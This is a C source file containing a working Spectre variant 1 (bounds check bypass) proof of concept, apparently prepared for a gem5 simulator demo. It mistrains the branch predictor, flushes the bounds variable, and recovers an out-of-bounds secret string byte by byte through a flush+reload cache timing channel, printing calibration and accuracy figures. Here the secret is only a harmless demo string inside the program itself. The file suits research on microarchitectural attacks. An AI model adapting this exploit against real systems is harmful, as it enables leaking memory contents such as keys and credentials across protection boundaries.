#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

static struct {
    uint8_t array1[16];
    uint8_t padding[48];
    uint8_t secret[64];
} data = {
    .array1 = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
    .secret = "The gem5 Spectre demo says hello",
};
#define array1 data.array1
static volatile unsigned array1_size __attribute__((aligned(64))) = 16;
static volatile uint8_t sink;
static uint8_t probe[256 * 512] __attribute__((aligned(4096)));
static const char *secret = (const char *)data.secret;

static inline uint64_t rdtsc(void)
{
    unsigned lo, hi;
    asm volatile("lfence\nrdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    return ((uint64_t)hi << 32) | lo;
}

static inline void fence(void)
{
    asm volatile("mfence" ::: "memory");
}

__attribute__((noinline, noclone, optimize("O0")))
static void victim_function(size_t x)
{
    if (x < array1_size)
        sink = probe[array1[x] * 512];
}

static uint64_t measure(volatile uint8_t *p, int flush)
{
    uint64_t t0, t1;
    if (flush)
        __builtin_ia32_clflush((const void *)p);
    fence();
    t0 = rdtsc();
    sink ^= *p;
    t1 = rdtsc();
    return t1 - t0;
}

static void calibrate(uint64_t *hit, uint64_t *miss)
{
    uint64_t h = 0, m = 0;
    for (int i = 0; i < 20; i++) {
        (void)probe[0];
        h += measure(&probe[0], 0);
        m += measure(&probe[0], 1);
    }
    *hit = h / 20;
    *miss = m / 20;
}

static int leak_byte(size_t malicious_x, uint64_t threshold, int rounds,
                     int jitter_range, int flush_stride, int attack_gap,
                     int byte_index, int *first_success)
{
    int scores[256] = {0};
    for (int r = 0; r < rounds; r++) {
        for (int i = 0; i < 256; i += flush_stride)
            __builtin_ia32_clflush((const void *)&probe[i * 512]);
        fence();
        // Keep the source line available; only the dependent probe line is secret.
        sink ^= data.secret[0];
        size_t training_x = (size_t)(r & 15);
        int extra_training = jitter_range ? rand() % jitter_range : 0;
        for (int t = 0; t < extra_training; t++) {
            __builtin_ia32_clflush((const void *)&array1_size);
            for (volatile int z = 0; z < 100; z++) {
            }
            victim_function(training_x);
        }
        for (int t = 29; t >= 0; t--) {
            __builtin_ia32_clflush((const void *)&array1_size);
            for (volatile int z = 0; z < 100; z++) {
            }
            size_t x = ((t % 6) - 1) & ~0xFFFF;
            x |= x >> 16;
            x = training_x ^ (x & (malicious_x ^ training_x));
            victim_function(x);
        }
        for (volatile int z = 0; z < attack_gap; z++)
            sink ^= (uint8_t)z;
        for (int j = 0; j < 256; j++) {
            int k = (j * 167 + 13) & 255;
            uint64_t dt = measure(&probe[k * 512], 0);
            if (dt <= threshold && k != array1[1])
                scores[k]++;
        }
    }
    int best = 0;
    for (int i = 1; i < 256; i++)
        if (scores[i] > scores[best])
            best = i;
    int second = best == 0 ? 1 : 0;
    for (int i = 0; i < 256; i++)
        if (i != best && scores[i] > scores[second])
            second = i;
    printf("top=%d(%d),%d(%d)\n", best, scores[best], second,
           scores[second]);
    if (best == (unsigned char)secret[byte_index] && !*first_success) {
        *first_success = 1;
        printf("[SPECTRE-POC] first-success byte=%d guest_tsc=%llu\n",
               byte_index, (unsigned long long)rdtsc());
    }
    return best;
}

int main(int argc, char **argv)
{
    int secret_len = argc > 1 ? atoi(argv[1]) : 8;
    int rounds = argc > 2 ? atoi(argv[2]) : 10;
    int jitter_range = argc > 3 ? atoi(argv[3]) : 0;
    unsigned seed = argc > 4 ? (unsigned)strtoul(argv[4], NULL, 0) : 0;
    int flush_stride = argc > 5 ? atoi(argv[5]) : 1;
    int attack_gap = argc > 6 ? atoi(argv[6]) : 0;
    if (argc > 4 && jitter_range == 0)
        jitter_range = 32;
    if (secret_len < 1 || secret_len > 8 || rounds < 1 || jitter_range < 0 ||
        flush_stride < 1 || flush_stride > 256 || attack_gap < 0)
        return 2;
    if (argc > 4)
        srand(seed);
    for (int i = 0; i < 256; i++)
        probe[i * 512] = (uint8_t)i;
    uint64_t hit, miss;
    calibrate(&hit, &miss);
    uint64_t threshold = (hit + miss) / 2;
    printf("secret=%.*s\n", secret_len, secret);
    printf("[SPECTRE-POC] calib hit=%lu miss=%lu threshold=%lu\n",
           hit, miss, threshold);
    printf("[SPECTRE-POC] jitter range=%d seed=%u\n", jitter_range, seed);
    printf("[SPECTRE-POC] flush stride=%d attack gap=%d\n",
           flush_stride, attack_gap);
    int correct = 0;
    int first_success = 0;
    for (int i = 0; i < secret_len; i++) {
        size_t malicious_x = (size_t)((uintptr_t)secret -
                                      (uintptr_t)array1) + i;
        int expected = (unsigned char)secret[i];
        int got = leak_byte(malicious_x, threshold, rounds, jitter_range,
                            flush_stride, attack_gap, i, &first_success);
        if (got == expected)
            correct++;
        printf("byte[%d] expected=%d got=%d %s\n", i, expected, got,
               got == expected ? "OK" : "FAIL");
    }
    printf("[SPECTRE-POC] accuracy=%d/%d\n", correct, secret_len);
    return 0;
}
